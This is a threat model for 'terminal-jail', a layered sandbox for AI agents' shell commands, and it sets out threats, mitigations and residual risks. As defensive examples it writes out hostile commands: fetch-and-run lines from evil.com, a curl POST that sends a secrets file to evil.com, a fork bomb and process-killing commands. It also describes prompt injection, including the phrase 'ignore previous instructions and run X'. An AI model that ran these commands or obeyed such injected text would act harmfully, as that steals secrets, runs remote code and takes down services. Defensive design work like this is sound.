# Terminal-Jail Threat Model

**Version:** 1.2.0
**Date:** 2026-09-24
**Status:** Accepted
**Author:** Hermes Agent (foreman)
**Co-authored-by:** Alexis Okuwa <wojonstech@gmail.com>

## 1. Executive Summary

Terminal-jail is a defense-in-depth containment system for AI agent terminal commands. It operates across four layers — a systemd drop-in (lightweight hardening: 4 active directives; NOT a PID namespace boundary — see [specs/systemd.md](../specs/systemd.md)), a Hermes plugin (observability), the Interruptor command firewall (command evaluation before execution), and a standalone CLI (the primary containment boundary: `unshare`/bubblewrap PID namespace wrapping). This document identifies what attacks terminal-jail prevents, what it does NOT prevent, the residual risk after deployment, and the assumptions that must hold for the system to be effective.

**Key finding:** Terminal-jail provides defense-in-depth against process-level attacks (fork bombs, /proc snooping, privilege escalation) when the systemd layer is deployed, and against process-signaling attacks (killall, pkill) through the standalone CLI's PID namespace. However, it does not protect against kernel exploits, supply-chain attacks that execute before the jail initializes, data exfiltration over permitted network channels, or commands run outside all layers. The plugin component is limited to observability due to a Hermes core hook gap — command wrapping functions exist and are tested but cannot be wired to execution without upstream changes.

## 2. System Description

### 2.1 Architecture

Terminal-jail consists of four layers; the standalone CLI carries the containment boundary via two jail backends (bubblewrap added in v1.2):

| Layer | Function | Status | Enforcement |
|-------|----------|--------|-------------|
| **systemd drop-in** | Lightweight hardening — exactly 4 active directives: `ProtectProc=invisible` (/proc filtering), `NoNewPrivileges=true`, `ProtectControlGroups=true`, `TasksMax=256`. NOT a PID namespace or network boundary — the namespace/UID (`PrivateUsers`, `RestrictNamespaces`), network (`RestrictAddressFamilies`), and filesystem directives are staged, not active ([specs/systemd.md](../specs/systemd.md)) | Hardening layer, not containment | Kernel-enforced (the 4 active directives) |
| **Hermes plugin** | Terminal command observability, metrics — command count (`wrap_count`, exported by `scripts/metrics-export.py`); byte-budget enforcement reserved — not implemented | Observability only | Python hooks |
| **Interruptor firewall** | Bash command firewall sitting between the LLM and shell execution: every command is parsed and evaluated against a rule engine (matcher + built-in allowlist/blocklist — the blocklist is always active) before exec; verdicts (allow/modify/block) cross the CLI↔Python JSON bridge (`interruptor_bridge.py`); mode via `TERMINAL_JAIL_INTERRUPTOR_MODE` (default enforce) | Active on CLI-wrapped commands (v1.2) | Python rule engine (block = exit 126) |
| **Standalone CLI — unshare backend** | `unshare` PID namespace wrapping for manual/automated use; fail-closed when unshare is missing or fails | Primary containment boundary (documented fallback) | Kernel-enforced PID namespace (user-invoked) |
| **Standalone CLI — bwrap backend (v1.2)** | bubblewrap jail, runtime-selected via `TERMINAL_JAIL_JAIL_BACKEND=auto\|bwrap\|unshare` (default `auto`: bwrap when installed and its namespace probe passes, else unshare); only bwrap provides a private /proc; `--die-with-parent` | Primary containment boundary (when selected) | Kernel-enforced user + PID namespaces (user-invoked) |

### 2.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│                        HOST KERNEL                          │
│  ┌──────────────────────────────────────────────────────┐  │
│  │              hermes-gateway.service                   │  │
│  │  ┌────────────────────┐  ┌────────────────────────┐  │  │
│  │  │  Hermes Gateway    │  │  Terminal Commands     │  │  │
│  │  │  (trusted process) │  │  (AI-generated)        │  │  │
│  │  │                    │  │                        │  │  │
│  │  │  Plugin observes ──┼──▶  UNTRUSTED ZONE       │  │  │
│  │  │                    │  │  ┌──────────────────┐  │  │  │
│  │  │                    │  │  │ PID namespace    │  │  │
│  │  │                    │  │  │ (CLI-wrapped only)│  │  │
│  │  │                    │  │  └──────────────────┘  │  │  │
│  │  └────────────────────┘  └────────────────────────┘  │  │
│  │                                                       │  │
│  │  TRUST BOUNDARY: systemd drop-in (lightweight)        │  │
│  │  - ProtectProc=invisible  - NoNewPrivileges=true     │  │
│  │  - ProtectControlGroups=true  - TasksMax=256         │  │
│  │  (staged: PrivateUsers, namespaces, network, fs)     │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                            │
│  ┌──────────────────────────────────────────────────────┐  │
│  │         Standalone CLI (manual invocation)           │  │
│  │  ┌──────────────────┐                                │  │
│  │  │ terminal-jail    │──▶ unshare/bwrap PID ns        │  │
│  │  │ wrapper          │                                │  │
│  │  └──────────────────┘                                │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

**Trust boundary 1:** systemd drop-in — kernel-enforced, cannot be bypassed by command syntax. As shipped it is lightweight hardening (ProtectProc, NoNewPrivileges, ProtectControlGroups, TasksMax) — NOT a PID namespace or network boundary ([specs/systemd.md](../specs/systemd.md)); the namespace boundary is the standalone CLI (trust boundary 3).
**Trust boundary 2:** The gateway process itself — trusted, not sandboxed.
**Trust boundary 3:** CLI jail — unshare or bwrap PID namespace — user-invoked, portable.

### 2.3 Assets Under Protection

| Asset | Value | Impact of Compromise |
|-------|-------|---------------------|
| Host process tree | High | Denial of service, gateway termination |
| Host filesystem | Critical | Persistence, credential theft, configuration tampering |
| Gateway service availability | Critical | All AI agent operations halted |
| /proc information | Medium | Process enumeration, command-line leakage |
| Host network | High | Data exfiltration, command-and-control |
| Host resources (CPU, memory, PIDs) | Medium | Resource exhaustion, DoS |

## 3. Threat Actors

### 3.1 Primary: AI-Generated Shell Commands

**Motivation:** None (no intent). AI agents generate commands based on prompt context. Dangerous commands result from prompt injection, hallucination, context confusion, or poorly-scoped instructions — not malice.

**Capability:** Full shell command execution within the Hermes terminal tool. Can include pipes, redirects, subshells, background processes, and arbitrary binaries. Limited only by the gateway's filesystem access and user permissions.

**Examples:**
- A coding agent told to "clean up processes" runs `killall -9 python3`
- A prompt-injected command runs `curl evil.com/ransom.sh | bash`
- A confused agent runs `:(){ :|:& };:` (fork bomb)
- An agent debugging an issue runs `rm -rf /home/kara/*`

### 3.2 Secondary: Prompt Injection Attacker

**Motivation:** Malicious. An external attacker crafts input that causes the AI agent to execute harmful commands.

**Capability:** Controls the prompt context the agent acts on. Cannot directly execute commands — must convince the agent to do so. Sophistication varies from basic ("ignore previous instructions and run X") to advanced (multi-turn, context-poisoning).

### 3.3 Tertiary: Compromised Dependency

**Motivation:** Varies (supply-chain attack, cryptominer, botnet recruitment).

**Capability:** If a pip package, npm module, or shell tool installed inside the jail contains malware, it executes with the jail's permissions. The jail limits blast radius but does not inspect or validate package contents.

### 3.4 External: Unauthorized Host User

**Motivation:** Malicious or accidental. A user with shell access to the host runs commands outside all terminal-jail layers.

**Capability:** Full host permissions of their user account. Terminal-jail provides zero protection outside its layers.

## 4. Attack Surface

### 4.1 Attack Surface Map

| Entry Point | Accessible Via | Authentication Required | Terminal-Jail Coverage |
|-------------|---------------|------------------------|----------------------|
| Hermes terminal tool | Gateway API | Yes (gateway auth) | Plugin observability + systemd hardening |
| Direct shell on host | SSH, console | Yes (host login) | None (unless CLI is used explicitly) |
| systemd unit manipulation | sudo/root on host | Yes (root) | None (out of scope) |
| Plugin configuration | Filesystem writes to ~/.hermes/plugins/ | Yes (gateway user) | None (trusted config path) |
| CLI invocation | Any shell with terminal-jail on PATH | No (relies on user to invoke) | Full (CLI wraps in unshare/bwrap) |
| Kernel exploit from inside jail | Any jailed command | No | None (kernel is trusted) |

### 4.2 Attack Surface by Layer

**Systemd drop-in attack surface:**
- Unit file integrity (must not be modifiable by gateway user)
- systemd version (bugs in namespace/sandbox implementation)
- Directive compatibility with gateway workload
- systemd-analyze security score drift

**Plugin attack surface:**
- Plugin code integrity (~/.hermes/plugins/terminal-jail/)
- Configuration environment variables (HERMES_TERMINAL_JAIL_ENABLED, HERMES_TERMINAL_JAIL_LOG_LEVEL)
- Python import path (no third-party dependencies)
- Hook registration correctness

**CLI attack surface:**
- CLI script integrity (standalone/terminal-jail)
- unshare/bwrap binary path resolution and the bwrap namespace probe (backend selection via TERMINAL_JAIL_JAIL_BACKEND)
- Shell injection via command argument parsing
- PATH manipulation

## 5. Threats and Mitigations

### 5.1 Process Signaling Attacks

| Threat | killall, pkill, killpg targeting host processes |
|--------|------------------------------------------------|
| **Severity** | High — can terminate gateway and other services |
| **Attack scenario** | Agent runs `killall -9 bash` or `pkill -f hermes` |
| **systemd mitigation** | As shipped: ProtectProc=invisible (active) hides host processes from /proc enumeration, defeating name/pattern-based killall/pkill. The stronger signaling containment — PrivateUsers UID masking, RestrictNamespaces — is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
| **Plugin mitigation** | None (observability only — logs the command) |
| **CLI mitigation** | unshare --pid creates separate PID namespace; host processes invisible |
| **Residual risk** | Processes inside the same namespace can still kill each other. If systemd layer is not deployed, only CLI provides protection — and only when explicitly invoked. |

### 5.2 Fork Bomb / Resource Exhaustion

| Threat | Uncontrolled process spawning consumes host resources |
|--------|------------------------------------------------------|
| **Severity** | Medium — can degrade host performance, trigger OOM |
| **Attack scenario** | Agent runs `:(){ :|:& };:` or spawns thousands of subprocesses |
| **systemd mitigation** | TasksMax=256 caps total tasks (active, cgroup-enforced); MemoryMax=1G is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
| **Plugin mitigation** | None (observability only) |
| **CLI mitigation** | PID namespace contains scope; ulimit -u 64 in test configuration |
| **Residual risk** | Up to 256 tasks (and, if the staged MemoryMax is activated, the configured memory cap) can still be consumed. If agent workload legitimately needs >200 tasks, TasksMax must be tuned upward — reducing fork bomb protection. |

### 5.3 Privilege Escalation

| Threat | setuid binary, file capability, or kernel exploit gains root |
|--------|-------------------------------------------------------------|
| **Severity** | Critical — full host compromise |
| **Attack scenario** | Agent runs a setuid binary or exploits a kernel vulnerability from inside jail |
| **systemd mitigation** | NoNewPrivileges=true (active) blocks setuid/capability gain; CapabilityBoundingSet= empty and ProtectSystem=strict are staged, not active ([specs/systemd.md](../specs/systemd.md)) |
| **Plugin mitigation** | None |
| **CLI mitigation** | None (unshare does not affect privileges) |
| **Residual risk** | Kernel exploits (CVE-level) bypass all layers. NoNewPrivileges is effective against userspace privilege escalation but does not protect against kernel bugs. The gateway user should remain unprivileged. |

### 5.4 /proc Snooping

| Threat | Reading /proc to discover host processes, command lines, environment |
|--------|---------------------------------------------------------------------|
| **Severity** | Medium — information disclosure, aids targeted attacks |
| **Attack scenario** | Agent runs `ps aux` or `cat /proc/1/cmdline` |
| **systemd mitigation** | ProtectProc=invisible hides unrelated processes; only self and children visible |
| **Plugin mitigation** | None |
| **CLI mitigation** | PID namespace limits visible processes to namespace members |
| **Residual risk** | Processes within the same namespace are visible. If the gateway and its workers share a namespace, worker A can see worker B's processes. |

### 5.5 Filesystem Tampering

| Threat | Malicious command writes to host filesystem for persistence |
|--------|------------------------------------------------------------|
| **Severity** | High — persistence, credential theft, configuration tampering |
| **Attack scenario** | `curl evil.com/backdoor | sh` writes to ~/.bashrc or /etc/cron.d/ |
| **systemd mitigation** | None as shipped — the filesystem directives (ProtectSystem=strict, ProtectHome=true, ReadWritePaths=) are staged, not active ([specs/systemd.md](../specs/systemd.md)) |
| **Plugin mitigation** | None |
| **CLI mitigation** | Namespace containment only by default; filesystem isolation where the host permits a uid-mapped `--user` namespace (loud degradation + `scripts/fs-isolation-probe.py` otherwise) |
| **Residual risk** | As shipped, the drop-in adds no filesystem restrictions — a command writes wherever the gateway user can. If the staged profile is activated, writable paths (/var/lib/hermes) can still be modified; if the gateway needs broader write access (project directories, build artifacts), the attack surface expands. An attacker who gains write access to logs could poison log analysis tools. |

### 5.6 Network Escapes

| Threat | Malicious command establishes network connection for exfiltration or C2 |
|--------|------------------------------------------------------------------------|
| **Severity** | High — data exfiltration, remote access |
| **Attack scenario** | Agent runs `curl -X POST https://evil.com/collect -d @/var/lib/hermes/secrets` |
| **systemd mitigation** | None as shipped — the network deny-list (RestrictAddressFamilies=~AF_INET AF_INET6 AF_NETLINK) is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
| **Plugin mitigation** | None |
| **CLI mitigation** | None |
| **Residual risk** | As shipped the drop-in imposes no network restriction. If the staged deny-profile is activated and the gateway requires outbound network access (HTTPS API calls, git operations, package downloads), AF_INET must be re-enabled — removing this protection. The staged deny-profile is suitable only for Unix-socket gateways. For TCP gateways, network protection must come from egress firewalls, HTTP proxies, or network policies outside terminal-jail. |

### 5.7 Plugin Bypass

| Threat | Command executed without plugin observation or wrapping |
|--------|-------------------------------------------------------|
| **Severity** | Low (currently — plugin is observability only, so bypass loses only metrics) |
| **Attack scenario** | Plugin disabled, uninstalled, or hook fails to fire |
| **systemd mitigation** | Still active — the systemd layer is independent |
| **CLI mitigation** | Still available for explicit manual invocation |
| **Residual risk** | Loss of observability: command-count metrics exist (`wrap_count` in the plugin, exported by `scripts/metrics-export.py`) but bypass loses them; no anomaly detection logs (byte-budget enforcement is not implemented in v1.1.0). If the hook gap is resolved and the plugin gains wrapping capability, plugin bypass becomes High severity. |

### 5.8 CLI Non-Use

| Threat | Command run directly without `terminal-jail` prefix |
|--------|----------------------------------------------------|
| **Severity** | High — no PID namespace isolation for that command |
| **Attack scenario** | User or automation runs `killall -9 bash` directly instead of `terminal-jail "killall -9 bash"` |
| **systemd mitigation** | Still active if run from within the gateway service tree |
| **Plugin mitigation** | Still observes if run through Hermes |
| **Residual risk** | Direct host shell commands have zero isolation. Operator discipline required. |

### 5.9 unshare Failure (Silent Fallback)

| Threat | unshare fails but command executes unsandboxed |
|--------|-----------------------------------------------|
| **Severity** | Critical — false sense of security |
| **Attack scenario** | unshare binary missing, kernel denies namespace creation, or mount-proc fails |
| **systemd mitigation** | Still active — independent mechanism |
| **Plugin mitigation** | Not applicable (plugin doesn't wrap) |
| **CLI mitigation** | Fail-closed by design: detects missing/failing unshare, exits non-zero, does not run command |
| **Residual risk** | If CLI is modified to fail-open (development mode), commands run without namespace. Production must use fail-closed. |

### 5.10 Supply Chain / Dependency Attack

| Threat | Malware in a package installed inside the jail |
|--------|-----------------------------------------------|
| **Severity** | Medium — contained to jail scope |
| **Attack scenario** | `pip install malicious-package` or `npm install evil-module` |
| **systemd mitigation** | Filesystem restrictions limit persistence; network restrictions (if active) limit exfiltration; TasksMax limits crypto-mining parallelism |
| **Plugin mitigation** | Observes the install command |
| **CLI mitigation** | PID namespace contains process tree |
| **Residual risk** | If network is permitted, malware can exfiltrate data or join a botnet. The jail limits blast radius but does not inspect package contents. |

## 6. What Terminal-Jail Does NOT Prevent

### 6.1 Out of Scope by Design

| Threat | Why Not Covered |
|--------|----------------|
| Kernel exploits (CVE-202X-XXXX) | Terminal-jail is a userspace tool. Kernel vulnerabilities bypass all namespace/isolation mechanisms. Mitigation: patch kernel, use MAC (AppArmor/SELinux), consider VM-level isolation for hostile code. |
| Container escapes | If the gateway runs inside Docker without systemd, terminal-jail's CLI provides PID namespaces but not the full systemd hardening suite. Mitigation: use Docker security options (--pids-limit, --read-only, --cap-drop=ALL, --security-opt=no-new-privileges). |
| Hardware-level attacks (Rowhammer, Spectre, Meltdown) | Out of scope. These require CPU microcode, kernel, and hypervisor mitigations. |
| Physical access | Attacker with physical access can bypass all software controls. |
| Social engineering | An attacker who convinces the operator to run commands outside terminal-jail bypasses all layers. |
| Insider threat (authorized user with host access) | Terminal-jail protects against AI-generated commands, not against a human operator who intentionally runs destructive commands directly. |
| Zero-day in Hermes core | If Hermes itself is compromised before command execution, the plugin may never see the command. |
| Timing side channels | PID namespace and systemd hardening do not prevent timing-based information leaks between processes. |
| Resource exhaustion below configured limits | TasksMax=256 still permits 256 processes. A determined attacker can consume all 256 slots with idle processes, denying service to legitimate work. |
| Data exfiltration via permitted channels | If network access is required (AF_INET enabled), data can be exfiltrated over HTTP/DNS/ICMP. Terminal-jail does not inspect or filter network traffic. The Interruptor's egress rules are a **shape** firewall over the command string — they block the named upload/exfil shapes (raw-socket payloads, interpreter sockets/HTTP, curl/wget file bodies, whole-tree and secret-source `rsync`/`scp`, and the `ssh`/`scp`/`sftp` transport, DF-TERMINAL-JAIL-30) but they do not sniff the wire, and an un-named shape (an alias/wrapper, a helper-script payload, a client binary outside the sets) still gets through. |

### 6.2 Current Gap: Plugin Cannot Wrap Commands

The most significant current limitation is structural: Hermes core has no pre-execution command-transform hook. The plugin's former wrapping functions (implemented and tested in earlier versions) could not be wired to command execution and were removed as dead code in v1.1.x (TJ-GAP-010). Until HOOK-GAP-01 (PR #68216) is merged or an equivalent hook is added to Hermes core:

- The plugin provides **metrics and visibility only**
- PID namespace isolation depends on the standalone CLI (unshare or bwrap backend) — the shipped systemd drop-in is not a namespace boundary
- There is no per-command wrapping happening automatically for Hermes terminal sessions

## 7. Residual Risk Matrix

| Risk | Likelihood | Impact | Residual Level | Rationale |
|------|-----------|--------|---------------|-----------|
| Process signaling attack (killall/pkill) | Medium | High | **Low** | ProtectProc=invisible (active) hides host processes from enumeration, defeating name/pattern-based kills; full containment via the CLI's PID namespace. PrivateUsers is staged, not active |
| Fork bomb | Low | Medium | **Low** | TasksMax=256 provides hard cap; PID namespace limits scope in CLI mode |
| Privilege escalation (setuid) | Low | Critical | **Low** | NoNewPrivileges=true (active) blocks userspace escalation; CapabilityBoundingSet is staged |
| /proc snooping | Medium | Medium | **Low** | ProtectProc=invisible is kernel-enforced |
| Filesystem tampering | Medium | High | **Medium-High** | As shipped the drop-in adds no filesystem restrictions (staged directives only); CLI mode contains the process tree but not the filesystem |
| Network escape | Medium | High | **High** | The drop-in's network deny-list is staged, not active — as shipped no network restriction exists at any layer; depends on external firewall. The Interruptor blocks named exfil shapes only (see §6.1) — shape matching, not wire inspection |
| Plugin bypass (loss of observability) | Low | Low | **Low** | Plugin is observability-only today; loss of metrics is low impact |
| CLI not used for manual commands | High | High | **High** | This is the weakest link — operator discipline required |
| Kernel exploit | Very Low | Critical | **Critical** | No mitigation at terminal-jail level |
| Supply chain malware | Low | Medium | **Medium** | Contained to jail scope but can still exfiltrate if network permitted |

## 8. Security Assumptions

Terminal-jail's effectiveness depends on these assumptions holding true:

1. **systemd is running and the drop-in is loaded.** If systemd is absent (Docker without systemd) or the drop-in is not applied, the lightweight hardening layer (process visibility, privilege, cgroup caps) is missing. Note: even when loaded, the drop-in is NOT the primary containment boundary — that role belongs to the standalone CLI's unshare/bwrap PID namespace ([specs/systemd.md](../specs/systemd.md)).

2. **The gateway user is unprivileged.** If hermes-gateway runs as root or a sudo-capable user, NoNewPrivileges and namespace isolation provide weaker guarantees.

3. **The unit file and drop-in are not modifiable by the gateway user.** An attacker who can edit 90-terminal-jail-hardening.conf can disable all systemd protections.

4. **unshare from util-linux is available and functional.** The CLI and intended plugin wrapping depend on it. The version must be >= 2.39 for --kill-child support.

5. **The kernel supports unprivileged user namespaces.** On Ubuntu 26.04 (kernel 7.0.0-27), unshare --mount-proc is blocked by default AppArmor/LSM policy. This is a known host limitation — the plugin gracefully degrades but PID namespace wrapping is unavailable.

6. **Commands that need isolation are run through one of the layers.** A command run in a plain SSH session has zero protection.

7. **The Herems gateway binary and plugin files have not been tampered with.** File integrity of the plugin and gateway is a prerequisite.

8. **Secrets are not exposed to the jail.** If AWS credentials, API keys, or SSH keys are mounted into the gateway's filesystem, a jailed command can potentially read them.

9. **Required network access is reviewed.** If the gateway needs outbound HTTPS, RestrictAddressFamilies must allow AF_INET — and network-level protections (firewall, proxy, egress filtering) become the primary network control.

## 9. Recommendations

### 9.1 Immediate (Before Production Deployment)

1. **Resolve HOOK-GAP-01:** Merge Hermes core PR #68216 or implement an equivalent pre-execution command-transform hook. Without this, the plugin cannot wrap commands — the project's core promise is not delivered.
2. **Apply systemd drop-in to production gateway.** Currently blocked (no sudo on this host). This is the single highest-impact security improvement.
3. **Conduct penetration test.** Run T9.2 test plan against a non-production gateway with all layers active.
4. **Verify secrets hygiene.** Audit the gateway's filesystem for credentials, SSH keys, API tokens, and Docker sockets. Remove or restrict access.

### 9.2 Medium-Term (Within 30 Days)

5. **Implement seccomp profile (T9.5).** An optional seccomp filter can further restrict syscalls available inside the jail (e.g., deny mount, pivot_root, kexec_load).
6. **Add user namespace support (T9.6).** Explore `unshare --user` for UID isolation — complementary to systemd's PrivateUsers.
7. **Deploy kernel compatibility watchdog (T10.1).** Cron job monitoring /proc/sys/kernel/unprivileged_userns_clone.
8. **Implement egress firewall rules.** If the gateway needs AF_INET, apply iptables/nftables rules to restrict outbound connections to known-safe destinations.

### 9.3 Long-Term (Quarterly)

9. **Quarterly security review (T10.4).** Re-evaluate threat model against new kernel features, CVEs, and Hermes core changes.
10. **Engage LKML on PID namespace kill semantics (T10.3).** Edge cases in PID namespace cleanup behavior should be discussed upstream.
11. **Supply chain signing (T9.4).** GPG-sign releases, verify install.sh integrity.

## 10. References

- [ADR-001 through ADR-005](adr/0001-architecture-decisions.md) — Architecture decision records
- [Plugin Specification](../specs/plugin.md) — Hook gap notice and plugin design
- [systemd Specification](../specs/systemd.md) — Drop-in directives and rationale
- [Integration Specification](../specs/integration.md) — Layer composition and verification
- [Hermes Core PR #68216](https://github.com/NousResearch/hermes-agent/pull/68216) — --sandbox flag
- MITRE ATT&CK: [Container Escape](https://attack.mitre.org/techniques/T1611/), [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
